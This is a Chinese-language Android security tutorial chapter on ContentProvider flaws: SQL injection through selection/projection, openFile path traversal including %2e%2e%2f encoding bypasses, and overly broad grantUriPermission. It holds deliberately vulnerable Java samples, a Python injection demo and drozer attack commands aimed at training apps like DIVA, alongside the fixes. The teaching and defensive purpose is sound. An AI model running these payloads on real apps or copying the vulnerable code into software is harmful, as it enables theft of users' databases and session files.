# Ch 6 — ContentProvider 漏洞：SQLi、path traversal、openFile

> **目標**：打通四大元件裡最像「傳統 Web 後端」的一個——ContentProvider。你會學到怎麼用 drozer 枚舉 exported Provider、怎麼在 `query()` 未過濾時打 SQL injection 把整張表 dump 出來、怎麼在 `openFile()` 未檢查 path 時用 `../` 讀任意檔案，以及 `grantUriPermission` 被濫用時怎麼借到不該有的 URI 存取權。這章收束 Part 2 的元件線，把 Web 安全的老朋友（SQLi、path traversal）搬到 Android 的 IPC 面上。

> **環境**：AVD（Android 13 / API 33），drozer、`adb`、`jadx`。靶場用 **DIVA**（Insecure Data Storage / Access Control 關卡有 Provider 洞）、**InsecureBankv2**。SQLi payload 的注入邏輯與 path traversal 的正規化用 **Python 3** 實跑，標「**實際輸出**」；drozer/adb 對真實 Provider 的執行輸出標「**未實測，理論預期行為**」+驗證步驟。

## 為什麼需要這個？

ContentProvider 是四大元件裡唯一天生跟「結構化資料存取」綁死的。它把 App 的資料（SQLite 表、檔案）包裝成 `content://` URI，讓別的元件（甚至別的 App）透過 `query`/`insert`/`update`/`delete`/`openFile` 存取。這個抽象很像一個微型的資料存取後端——於是它繼承了後端的所有經典洞：**query 拼字串 → SQL injection；openFile 不檢查 path → path traversal 任意檔案讀取**。

危險在於：一個 exported ContentProvider 等於「把 App 的資料庫和檔案系統開了一個對外 API」。開發者常以為「反正只有自己 App 會用」，於是 query 直接拼 selection、openFile 直接把 URI 當路徑用。攻擊者裝一個普通 App，就能把 victim 的使用者表、session token、私有檔案 dump 出來——不需要 root。DIVA 的 Provider 關卡就是這樣埋的，真實 App 裡（尤其是內建通訊錄、備份、檔案分享類）到今天還在爆。

Ch 3 教你「Provider exported 是攻擊面」，這章教你「攻擊面裡具體有哪些洞、怎麼打」。它也是 Web 安全知識能無縫遷移的地方——如果你打過 Web SQLi，這章你會很有既視感。

## 先建立直覺：Provider 是一個 URI 後端

先建立模型。ContentProvider 把資料暴露成一組以 `content://` 為前綴的 URI，六個方法對應 CRUD + 開檔：

```
   別的 App（攻擊者）                        victim 的 ContentProvider
 ┌──────────────────┐                     ┌─────────────────────────────────────┐
 │ ContentResolver  │  content:// URI     │  authority = com.victim.provider      │
 │  .query(uri,...) ─┼────────────────────▶│   ┌───────────────────────────────┐ │
 │  .openFile(uri)  ─┼────────────────────▶│   │ query()   → SELECT ... (SQLi) │ │
 │  .insert/update  ─┼────────────────────▶│   │ openFile()→ 開檔 (path trav.) │ │
 │                  │                      │   │ insert/update/delete          │ │
 └──────────────────┘                      │   └───────────────────────────────┘ │
                                           │        │              │              │
                                           │        ▼              ▼              │
                                           │   SQLite DB      App 私有檔案系統     │
                                           └─────────────────────────────────────┘
   URI 長相：content://com.victim.provider/users/1
                        └── authority ──┘ └path┘
```

兩個關鍵事實：

1. **Provider 用 `authority` 定位（不是 package），用 URI path 選資料**。攻擊者要打，先知道 authority（drozer/Manifest 看得到），再猜/枚舉 path。
2. **query 的 `selection`/`projection`/`sortOrder` 和 openFile 的 path，都是攻擊者能透過 URI 或參數控制的輸入**。凡是這些輸入被直接拼進 SQL 或當檔案路徑用，就有注入/穿越。

跟 Web 的對應：`authority` ≈ 主機、URI path ≈ 路由、`selection` ≈ query string 裡的參數。打 Web 後端的直覺整套能搬過來。

## 底層機制一：query() 的 SQL injection

`ContentProvider.query()` 的簽名是 `query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder)`。安全的寫法是把使用者輸入放進 `selectionArgs`（參數化查詢，`?` 佔位），Android 的 SQLite 綁定會把它當**資料**而非 **SQL**。危險的寫法是把輸入**拼進 selection 字串**。

漏洞版 Provider（Java，**漏洞點已標**）：

```java
public Cursor query(Uri uri, String[] projection, String selection,
                    String[] selectionArgs, String sortOrder) {
    SQLiteDatabase db = dbHelper.getReadableDatabase();
    // 漏洞點：直接把呼叫者傳來的 selection 拼進 SQL，沒用參數化。
    // 攻擊者控制 selection，就能注入。
    String table = "users";
    return db.query(table, projection, selection, selectionArgs, null, null, sortOrder);
    // 註：db.query 本身若正確用 selectionArgs 是安全的；
    //    洞在於 selection/projection 由不可信呼叫者直接提供且被信任。
}
```

當 selection 由攻擊者透過 `ContentResolver.query(uri, projection, selection, ...)` 直接控制，或 Provider 自己從 URI path 拼 selection 時，注入就成立。我用 Python 的 sqlite3 模擬 Provider 底層那句 `SELECT` 被注入的效果（**實際輸出**）：

```python
import sqlite3
con = sqlite3.connect(":memory:"); cur = con.cursor()
cur.execute("CREATE TABLE users(id INTEGER, name TEXT, password TEXT)")
cur.executemany("INSERT INTO users VALUES(?,?,?)",
                [(1,"alice","s3cr3t"),(2,"bob","hunter2"),(3,"admin","rootpw")])
con.commit()

def vuln_query(projection, selection):
    sql = f"SELECT {projection} FROM users WHERE {selection}"   # 字串拼接 = 漏洞
    return sql, cur.execute(sql).fetchall()

print(vuln_query("name", "id=1"))                    # 正常：只查自己
print(vuln_query("name", "id=1 OR 1=1"))             # 注入 selection：dump 全表
print(vuln_query("name FROM users UNION SELECT password", "1=1"))  # 注入 projection：撈密碼
con.close()
```

```
('SELECT name FROM users WHERE id=1', [('alice',)])
('SELECT name FROM users WHERE id=1 OR 1=1', [('alice',), ('bob',), ('admin',)])
('SELECT name FROM users UNION SELECT password FROM users WHERE 1=1', [('admin',), ('alice',), ('bob',), ('hunter2',), ('rootpw',)])
```

看清楚三件事：`id=1 OR 1=1` 把 WHERE 條件短路成永真，**dump 全表**；把 `projection` 注入 `... UNION SELECT password` **把密碼欄拉出來**。這就是為什麼 Provider 絕不能信任呼叫者給的 selection/projection——它們是 SQL 片段，不是純資料。

用 drozer 打 Provider 的 SQLi（**未實測，理論預期行為**）：

```
# 枚舉 provider 與可存取的 URI
dz> run app.provider.info -a com.victim
dz> run scanner.provider.finduris -a com.victim

# 對某 content URI 做 query，注入 projection / selection
dz> run app.provider.query content://com.victim.provider/users \
      --projection "* FROM sqlite_master WHERE type='table'--"
dz> run app.provider.query content://com.victim.provider/users \
      --selection "1=1"

# drozer 內建的 SQLi / path traversal 掃描器
dz> run scanner.provider.injection -a com.victim
dz> run scanner.provider.traversal -a com.victim
```

`scanner.provider.injection` 代表性輸出（**未實測，理論預期行為**）：

```
Injection in Projection:
  content://com.victim.provider/users
Injection in Selection:
  content://com.victim.provider/users
```

**驗證步驟**：AVD 裝 DIVA，用 `app.provider.finduris -a jakhar.aseem.diva` 找出可存取 URI，對它跑 `scanner.provider.injection`；掃到注入點後用 `app.provider.query` 帶 `--projection "* FROM sqlite_master--"` 手動確認能列出資料表結構（經典的「先摸 schema 再撈資料」）。掃描器報的點要手動 query 驗一次，避免誤報。

## 底層機制二：openFile() 的 path traversal

`ContentProvider.openFile(Uri uri, String mode)` 讓呼叫者透過 URI 開一個檔案，回傳 `ParcelFileDescriptor`。典型用途是檔案分享（`content://.../shared/report.pdf`）。危險在於：如果 Provider 把 URI 的最後一段**直接當檔名接到某個 base 目錄後面開檔**，攻擊者就能用 `../` 跳出 base，讀 App 私有目錄的任意檔案（甚至部分系統檔）。

漏洞版（Java，**漏洞點已標**）：

```java
public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
    // 漏洞點：直接把 URI 的 path 接到 base 後面，沒做正規化與 base 邊界檢查。
    String name = uri.getLastPathSegment();          // 攻擊者控制，可含 ../
    File base = new File(getFilesDir(), "shared");    // 本意：只開 files/shared/ 下的檔
    File target = new File(base, name);               // ../ 可跳出 base！
    return ParcelFileDescriptor.open(target, ParcelFileDescriptor.MODE_READ_ONLY);
}
```

我用 Python 的 `posixpath.normpath` 模擬「base + 使用者輸入」正規化後有沒有跳出 base（**實際輸出**）：

```python
import posixpath
base = "/data/data/com.victim/files/shared/"
for name in ["report.pdf", "../databases/users.db",
             "../../../../data/data/com.victim/shared_prefs/session.xml",
             "..%2f..%2fsecret"]:
    joined = base + name
    norm = posixpath.normpath(joined)
    escaped = not norm.startswith(posixpath.normpath(base))
    print(f"{name:52s} -> {norm:48s} escaped_base={escaped}")
```

```
report.pdf                                           -> /data/data/com.victim/files/shared/report.pdf   escaped_base=False
../databases/users.db                                -> /data/data/com.victim/files/databases/users.db  escaped_base=True
../../../../data/data/com.victim/shared_prefs/session.xml -> /data/data/com.victim/shared_prefs/session.xml   escaped_base=True
..%2f..%2fsecret                                     -> /data/data/com.victim/files/shared/..%2f..%2fsecret escaped_base=True
```

看第 2、3 行：`../` 把路徑正規化後**跳出了 `shared/` base**，指到 `databases/users.db`（App 的 SQLite 主庫）和 `shared_prefs/session.xml`（session）。第 4 行 `..%2f...` 有個重點：Python 的 `normpath` **沒有解碼 `%2f`**，所以它沒跳出——但**在 Android 上，URI 解析可能先把 `%2f` 解碼成 `/` 再交給你的程式碼**，於是繞過只看 literal `../` 的過濾。這是 path traversal 的經典繞法：**先解碼再正規化，順序決定生死**。

正確的防禦是**正規化之後、再檢查有沒有留在 base 內**（Java 用 `File.getCanonicalPath()`）：

```java
File target = new File(base, name).getCanonicalFile();   // 解 symlink + 正規化 ../
if (!target.getPath().startsWith(base.getCanonicalPath() + File.separator)) {
    throw new SecurityException("path escapes base");    // 跳出 base，拒絕
}
```

drozer 打 traversal（**未實測，理論預期行為**）：

```
dz> run scanner.provider.traversal -a com.victim
# 命中後手動讀任意檔案：
dz> run app.provider.read content://com.victim.provider/../../databases/users.db
```

**驗證步驟**：對靶 Provider 跑 `scanner.provider.traversal`；命中後用 `app.provider.read` 帶 `../` 嘗試讀 `databases/` 下的 db 或 `shared_prefs/`，把讀出的內容跟你 `adb root` 後 `cat` 該檔案比對確認是同一份。若 literal `../` 被過濾，試 `%2e%2e%2f`（編碼繞過）——這步能驗證「先解碼再正規化」的漏洞。

## 底層機制三：grantUriPermission 濫用

有時 Provider 本身 `exported=false`（不對外開），開發者改用 `grantUriPermission`（或 Intent 的 `FLAG_GRANT_READ_URI_PERMISSION`）**臨時**把某個特定 URI 的存取權「借」給某個 App。用得對是安全設計（只借一個 URI、用完撤銷）。用錯的兩種形態：

1. **`android:grantUriPermissions="true"` 開得太寬**：在 Manifest 給整個 authority 開放臨時授權，配合任何能觸發授權的入口（例如一個 exported 元件回傳帶 grant flag 的 Intent），攻擊者就能拿到本不該有的 URI 存取權。這正是 Ch 4 範例二「借道竊取檔案」的另一端。
2. **授權範圍過大**：本意借 `content://.../shared/report.pdf`，卻用 `<grant-uri-permission android:pathPrefix="/">` 把整個樹都授權出去，攻擊者拿到一個 URI 就能存取整個 Provider。

```xml
<!-- 危險：整個 authority 都可被臨時授權，且 path prefix 是根 -->
<provider android:name=".FileProvider" android:authority="com.victim.provider"
          android:exported="false" android:grantUriPermissions="true">
    <grant-uri-permission android:pathPrefix="/"/>   <!-- ← 授權範圍過大 -->
</provider>
```

**修法**：授權範圍收到最小（`<grant-uri-permission android:path="/shared/report.pdf"/>` 或精確的 `pathPattern`），且授權的觸發點（哪個元件會發帶 grant flag 的 Intent）要嚴格控制對象。`FileProvider`（AndroidX）是官方推薦的安全實作，它用 `res/xml` 白名單明確列出可分享的目錄，避免手寫 openFile 的 traversal。

## 對比與取捨

| Provider 洞 | 根因 | 危害 | 修法 |
|---|---|---|---|
| **SQLi (selection/projection)** | 拼字串進 SQL，信任呼叫者 | dump 整庫、撈密碼/token | 參數化 `selectionArgs`；固定 projection 白名單；不讓呼叫者控 selection |
| **path traversal (openFile)** | URI path 當檔名、未正規化檢查 base | 讀任意私有檔（db/session） | `getCanonicalPath()` 後檢查 startsWith(base)；用 `FileProvider` |
| **grantUriPermission 濫用** | 授權範圍過大/入口失控 | 借到不該有的 URI 存取 | 最小授權範圍 + 控制觸發點 |

| Provider 設定 | 對外可存取？ | 攻擊面 |
|---|---|---|
| `exported=false`（且無 grant） | 否（僅同 App） | 低（要靠 Ch4 借道） |
| `exported=true` 無 permission | **任何 App** | 高，SQLi/traversal 主戰場 |
| `exported=false` + `grantUriPermissions=true` 開太寬 | 被授權者可存取 | 中～高（看授權範圍與入口） |
| exported + `android:permission` (signature) | 僅同簽名 App | 低 |

## 踩雷集錦

1. **只測 exported 的 Provider**：`exported=false` 但 `grantUriPermissions=true` 的 Provider 仍可能透過借道被存取（Ch 4）。別因為 exported=false 就跳過。
2. **只過濾 literal `../`**：`%2e%2e%2f`、`..\`、雙重編碼、`....//` 這些變形能繞過只比對字面 `../` 的過濾。正解是**先解碼、`getCanonicalPath()` 正規化、再檢查 base 邊界**，不是黑名單過濾字串。順序錯（先檢查後解碼）等於沒防。
3. **以為用了 `db.query(...selectionArgs...)` 就一定安全**：參數化只保護「放進 selectionArgs 的值」。如果 **projection 或 table 名或 sortOrder** 是呼叫者可控且被拼進 SQL，照樣注入。SQLi 的注入點不只 WHERE。
4. **掃描器命中就當洞**：`scanner.provider.injection/traversal` 會有誤報（有些「注入」其實回空結果或被上層擋）。一定要用 `app.provider.query`/`read` 手動撈出真實資料才算實證。
5. **忽略 insert/update/delete 面**：SQLi 不只在 query。`update`/`delete` 的 selection 同樣可注入，`insert` 的欄位若拼進 SQL 也可能。而且寫入面可能更危險（改別人資料）。四個方法都要審。

## 進階：再往深一層

- **`sqlite_master` 與盲注**：不知道表名時，先 `SELECT * FROM sqlite_master WHERE type='table'` 拉出所有表與建表 SQL（schema），再針對性 dump。若 query 不直接回內容（盲注），可用 `CASE WHEN ... THEN` 配合布林/時間差判斷——跟 Web 盲注同理。
- **`ParcelFileDescriptor` 的 mode 與寫入**：openFile 若接受 `MODE_WRITE`/`MODE_READ_WRITE` 且 path 可穿越，就不只是任意讀，而是**任意寫**——可覆寫 App 的 db、prefs、甚至可執行的 dex（若配合其他條件）。審 openFile 要看它允許什麼 mode。
- **`call()` 方法的攻擊面**：ContentProvider 還有個少被注意的 `call(String method, String arg, Bundle extras)`，是自訂 RPC 入口，常繞過標準的 query 權限模型、直接觸發 App 邏輯。exported Provider 的 `call` 值得單獨審。
- **`FileProvider` 的正確用法與它自己的坑**：官方 `FileProvider` 用 `filepaths.xml` 白名單避免 traversal，但若白名單寫成 `<root-path>` 或 `<external-path path="."/>` 這種過寬設定，一樣把整個外部儲存暴露。安全元件配錯照樣是洞。

## 動手練習

1. 對 DIVA 用 drozer `app.provider.finduris` + `scanner.provider.injection`，找出可注入的 Provider URI，再用 `app.provider.query --projection "* FROM sqlite_master--"` 手動列出所有資料表，最後 dump 出一張含敏感資料的表。全程截圖當 PoC。
2. 自寫一個有 openFile path traversal 洞的靶 Provider（照範例二），先用 literal `../` 讀出 `databases/` 下的 db 驗證；再給它加一個「過濾字面 `../`」的假防禦，用 `%2e%2e%2f` 或雙重編碼繞過它——親手驗證「黑名單過濾 vs 正規化檢查」的差別。
3. 把靶的 openFile 改成正確防禦（`getCanonicalPath()` + `startsWith(base)`），重跑所有繞過 payload，確認全被擋。這一正一反讓你記住「正確的 path 邊界檢查長什麼樣」。

## 本章重點整理

- ContentProvider 是**以 `authority` + URI 定位的資料後端**，繼承了 Web 後端的經典洞：query 拼字串 → **SQLi**、openFile 不檢查 path → **path traversal**。
- **SQLi**：selection/projection/table/sortOrder 任一被呼叫者控制且拼進 SQL 就中；正解是參數化 + projection 白名單，注入點不只 WHERE。
- **path traversal**：`../`（含 `%2f` 編碼繞法）跳出 base 讀任意私有檔；正解是**先解碼、`getCanonicalPath()`、再檢查 startsWith(base)**，黑名單過濾字串不可靠。
- **grantUriPermission** 開太寬或授權範圍過大，會把 `exported=false` 的 Provider 也變成攻擊面；最小授權 + 控制觸發點，優先用 `FileProvider`。
- drozer 掃描器（`scanner.provider.injection/traversal`）幫你**找**，但一定要 `app.provider.query`/`read` **手動撈出真實資料**才算實證。

## 自我檢核

- [ ] 不看筆記，能講出 Provider 的 query SQLi 有哪些注入點（不只 selection）
- [ ] 能說出為什麼「只過濾字面 `../`」擋不住 path traversal，正確的正規化檢查怎麼寫、順序為什麼重要
- [ ] 能解釋 `exported=false` 的 Provider 為什麼仍可能被存取（grantUriPermission / 借道）
- [ ] 給你一段 openFile，能判斷它有沒有 traversal，以及若允許寫入 mode 危害如何放大
- [ ] 知道 drozer 掃描器的結果為什麼要手動 query/read 驗證，不能直接當洞報

## 延伸閱讀

- **[OWASP MASTG — Testing Content Providers（SQLi / path traversal）](https://mas.owasp.org/MASTG/tests/android/MASVS-STORAGE/)**
  - **讀哪裡**：ContentProvider 的 SQL injection 與 path traversal test case（含 drozer 指令範例）
  - **和本章的關聯**：本章的枚舉→注入→穿越流程就是這些 test case 的實作；報告措辭與嚴重度以此為準
- **[drozer — Content Provider 攻擊模組](https://github.com/WithSecureLabs/drozer)**
  - **讀哪裡**：`app.provider.*`、`scanner.provider.injection`、`scanner.provider.traversal`、`scanner.provider.finduris` 的用法
  - **前提知識**：讀過本章的枚舉段，這裡給你每個 module 的完整參數
- **[Android 官方 — FileProvider / grantUriPermission](https://developer.android.com/reference/androidx/core/content/FileProvider)**
  - **讀哪裡**：`FileProvider` 的 `filepaths.xml` 設定，以及 URI 權限授予/撤銷的正確做法
  - **為什麼權威**：openFile 與 URI 授權的安全實作以此為準；本章「用 FileProvider 取代手寫 openFile」的依據
- **[HackTricks — Exploiting Content Providers](https://book.hacktricks.wiki/en/mobile-pentesting/android-app-pentesting/index.html)**
  - **讀哪裡**："Exploiting Content Providers"（SQLi、path traversal、`sqlite_master` 撈 schema 的實戰指令）
  - **和本章的關聯**：可複製的 drozer 攻擊指令與盲注技巧，補齊本章 PoC 手感

Ch 3–6 把「元件與 IPC」這條線走完了：exported 直接打、redirection 借道、PendingIntent 劫持、Provider 的資料層洞。接下來該把這些技巧在一個真實的靶上串起來練——這正是練習 A 要做的：拿 drozer 對一個靶 App 從頭枚舉到打出 PoC。

→ [練習 A：drozer 打靶找元件漏洞](./practice-a-drozer-hunt.md)
